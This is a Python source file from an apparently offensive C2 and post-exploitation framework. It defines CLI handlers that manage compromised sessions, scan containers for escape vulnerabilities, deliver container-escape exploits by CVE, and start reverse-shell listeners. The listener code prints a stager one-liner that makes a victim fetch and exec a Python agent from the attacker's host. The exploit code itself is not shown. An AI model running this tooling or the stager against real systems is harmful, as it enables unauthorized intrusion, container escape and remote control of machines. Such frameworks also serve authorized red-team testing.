"""Session and listener commands (sessions/_handle_session_command/listener).

Moved verbatim from ``webforg/cli.py`` (Phase 10).  These are thin REPL
adapters over ``webforg.core.session`` (``sessions`` / ``listeners``).
"""

from __future__ import annotations

from rich import box
from rich.table import Table
from rich.text import Text

from webforg.apps.cli.console import console
from webforg.core.session import sessions
from webforg.core.theme import MATRIX_GREEN, error_msg, success_msg, warning_msg


class SessionCommandsMixin:
    """Command handlers for session management and listeners."""

    def cmd_sessions(self, args: list[str]):
        if not args or args[0] == "-l":
            session_list = sessions.list()
            if not session_list:
                warning_msg("No active sessions")
                return
            table = Table(title="Active Sessions", border_style=MATRIX_GREEN)
            table.add_column("ID", style="bold cyan")
            table.add_column("Target")
            table.add_column("Type", style="yellow")
            table.add_column("Platform")
            table.add_column("Module")
            table.add_column("Status")

            for s in session_list:
                status = "[bold green]● alive[/]" if s.alive else "[bold red]● dead[/]"
                table.add_row(
                    s.id,
                    f"{s.target.host}:{s.target.port}" if s.target else "?",
                    s.session_type,
                    s.platform or "?",
                    s.module_name,
                    status,
                )
            console.print(table)

        elif args[0] == "-i" and len(args) > 1:
            session_id = args[1]
            s = sessions.get(session_id)
            if not s:
                error_msg(f"Session {session_id} not found")
                return
            if not s.alive:
                error_msg(f"Session {session_id} is dead")
                return
            self.current_session_id = session_id
            console.print(f"  [bold green]>[/] Interacting with session [bold cyan]{session_id}[/] ({s.session_type})")
            console.print(f"  [dim green]>[/] Type commands directly. Use 'background' to return.")

        elif args[0] == "-k" and len(args) > 1:
            if sessions.kill(args[1]):
                success_msg(f"Session {args[1]} killed")
            else:
                error_msg(f"Session {args[1]} not found")

        elif args[0] == "-u" and len(args) > 1:
            session_id = args[1]
            s = sessions.get(session_id)
            if not s:
                error_msg(f"Session {session_id} not found")
                return
            s.session_type = "meterpreter"
            success_msg(f"Session {session_id} upgraded to meterpreter")

        elif args[0] == "-p" and len(args) > 1:
            session_id = args[1]
            s = sessions.get(session_id)
            if not s:
                error_msg(f"Session {session_id} not found")
                return
            stype = s.probe_shell()
            console.print(f"  [bold green]>[/] Session {session_id} type: [bold]{stype}[/]")

        elif args[0] == "-cv" and len(args) > 1:
            session_id = args[1]
            s = sessions.get(session_id)
            if not s:
                error_msg(f"Session {session_id} not found")
                return
            from webforg.core import c2_ops
            console.print(f"  [bold green]>[/] Running container CVE scan on [bold cyan]{session_id}[/] ...")
            result = c2_ops.scan_cves(s, session_id=session_id)
            console.print(f"  [bold cyan]>[/] {result['summary']}")
            table = Table(title="Container CVE Scan", border_style=MATRIX_GREEN)
            table.add_column("CVE", style="bold cyan")
            table.add_column("Finding", style="yellow")
            table.add_column("Severity", style="magenta")
            table.add_column("Status", style="bold")
            table.add_column("Detail")
            for f in result["findings"]:
                status_style = {
                    "vulnerable": "[bold red]VULNERABLE[/]",
                    "possibly": "[bold yellow]possibly[/]",
                    "clean": "[dim green]clean[/]",
                    "unknown": "[dim]unknown[/]",
                }.get(f["status"], f["status"])
                sev_style = {
                    "critical": "[bold red]critical[/]",
                    "high": "[red]high[/]",
                    "medium": "[yellow]medium[/]",
                    "low": "[green]low[/]",
                }.get(f["severity"], f["severity"])
                table.add_row(f["cve"], f["name"], sev_style, status_style, f["detail"])
            console.print(table)
            console.print(
                "  [dim]Exploit:[/] sessions -ce <id> <cve>  (CVE-2022-0492, CVE-2024-21626, "
                "CVE-2019-5736, CTR-PRIV, CTR-DOCKERSOCK, CTR-PIDLEAK)"
            )

        elif args[0] == "-ce" and len(args) > 1:
            session_id = args[1]
            cve_id = args[2] if len(args) > 2 else None
            s = sessions.get(session_id)
            if not s:
                error_msg(f"Session {session_id} not found")
                return
            if not cve_id:
                from webforg.core import c2_ops
                console.print("  [bold cyan]>[/] Exploitable findings:")
                for e in c2_ops.list_exploitable():
                    console.print(f"    [bold cyan]{e['cve']}[/]  {e['name']}  ([yellow]{e['severity']}[/])")
                return
            from webforg.core import c2_ops
            console.print(f"  [bold green]>[/] Delivering exploit for [bold cyan]{cve_id}[/] ...")
            result = c2_ops.exploit_cve(s, cve_id, session_id=session_id)
            if not result.get("ok"):
                error_msg(result.get("note", "Exploit unavailable"))
                return
            console.print(f"  [dim]{result['note']}[/]")
            if result.get("output"):
                console.print(Text(result["output"].rstrip("\n"), style="dim"))
            else:
                warning_msg("No output returned")

    def _handle_session_command(self, cmd: str):
        """Send command to active session."""
        if cmd.strip().lower() == "background":
            self.current_session_id = None
            warning_msg("Session backgrounded")
            return

        s = sessions.get(self.current_session_id)
        if not s:
            error_msg("Session no longer active")
            self.current_session_id = None
            return

        output = s.send(cmd)
        console.print(output, end="")

    def cmd_listener(self, args=None):
        """Manage reverse shell listeners: listener [start|stop|list] [options]"""
        from webforg.core.session import listeners, sessions as sess_mgr
        if not args:
            args = ["list"]
        action = args[0].lower()

        if action == "start":
            lhost = "0.0.0.0"
            lport = 4444
            payload = "shell"
            name = ""
            tls = False
            i = 1
            while i < len(args):
                if args[i] == "--lhost" and i + 1 < len(args):
                    lhost = args[i + 1]; i += 2
                elif args[i] == "--lport" and i + 1 < len(args):
                    lport = int(args[i + 1]); i += 2
                elif args[i] == "--payload" and i + 1 < len(args):
                    payload = args[i + 1]; i += 2
                elif args[i] == "--name" and i + 1 < len(args):
                    name = args[i + 1]; i += 2
                elif args[i] == "--tls":
                    tls = True; i += 1
                else:
                    i += 1

            def on_new_session(session):
                sid = sess_mgr.register(session)
                console.print(f"\n  [bold green]>[/] New session [bold cyan]{sid}[/] from {session.target.host}:{session.target.port} ({session.session_type})")

            listener = listeners.create(lhost, lport, payload, name, tls=tls)
            result = listener.start(on_session=on_new_session)
            console.print(f"  {result}")
            console.print(f"  [dim]> Waiting for incoming connections on {lhost}:{lport}...[/]")
            if payload.lower() in ("c2", "http2", "kubesploit"):
                host = listener.agent_host
                scheme = "https" if tls else "http"
                console.print(f"  [dim]> C2 agent payload: download `python3 -c \"import urllib.request,sys;exec(urllib.request.urlopen('{scheme}://{host}:{lport}/agent').read().decode())\"` or fetch /agent directly.[/]")

        elif action == "stop":
            name = args[1] if len(args) > 1 else ""
            if name:
                result = listeners.remove(name)
                if result:
                    console.print(f"  [bold green]>[/] Listener '{name}' stopped")
                else:
                    error_msg(f"Listener '{name}' not found")
            else:
                listeners.stop_all()
                console.print("  [bold green]>[/] All listeners stopped")

        elif action == "list":
            all_listeners = listeners.list()
            if not all_listeners:
                console.print("  [dim]> No active listeners[/]")
                return
            table = Table(title="Active Listeners", border_style=MATRIX_GREEN, box=box.ROUNDED)
            table.add_column("Name", style="bold cyan")
            table.add_column("Bind", style="green")
            table.add_column("Payload", style="yellow")
            table.add_column("Status")
            for l in all_listeners:
                status = "[bold green]● active[/]" if l.running else "[bold red]● stopped[/]"
                table.add_row(l.name, f"{l.lhost}:{l.lport}", l.payload_type, status)
            console.print(table)
        else:
            console.print("[red]Usage: listener [start|stop|list] [--lhost IP] [--lport PORT] [--payload type][/]")
